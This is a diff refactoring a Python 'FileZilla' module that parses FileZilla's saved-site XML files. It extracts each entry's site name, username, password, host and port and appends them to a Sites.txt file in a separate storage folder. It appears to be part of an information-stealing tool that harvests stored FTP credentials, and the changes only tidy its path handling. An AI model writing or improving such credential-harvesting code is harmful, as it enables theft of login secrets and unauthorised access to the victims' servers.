@@ -11,9 +11,7 @@ class FileZilla:
     """
     def __init__(self, storage_path: str, folder: str):
 
-        self.__storage_path = storage_path
-        self.__folder = folder
-
+        self.__full_path = path.join(storage_path, folder)
         self.__config = FileZillaConfig()
 
     def __create_folder(self) -> None:
@@ -21,10 +19,8 @@ class FileZilla:
         Creates storage for the FileZilla module.
         :return: None
         """
-        folder = rf"{self.__storage_path}\{self.__folder}"
-
-        if not path.exists(folder):
-            makedirs(folder)
+        if not path.exists(self.__full_path):
+            makedirs(self.__full_path)
 
     def __get_sites(self) -> None:
         """
@@ -46,7 +42,7 @@ class FileZilla:
 
         for file in data_files:
 
-            root = ElementTree.parse(rf"{self.__config.SitesPath}\{file}").getroot()
+            root = ElementTree.parse(path.join(self.__config.SitesPath, file)).getroot()
             data = self.__config.FileZillaData
 
             if not root:
@@ -63,7 +59,7 @@ class FileZilla:
 
                 temp.append(data.format(site_name, site_user, site_pass, site_host, site_port))
 
-        with open(rf"{self.__storage_path}\{self.__folder}\Sites.txt", "a", encoding="utf-8") as file_zilla:
+        with open(path.join(self.__full_path, "Sites.txt"), "a", encoding="utf-8") as file_zilla:
             file_zilla.write("".join(item for item in temp))
 
         file_zilla.close()
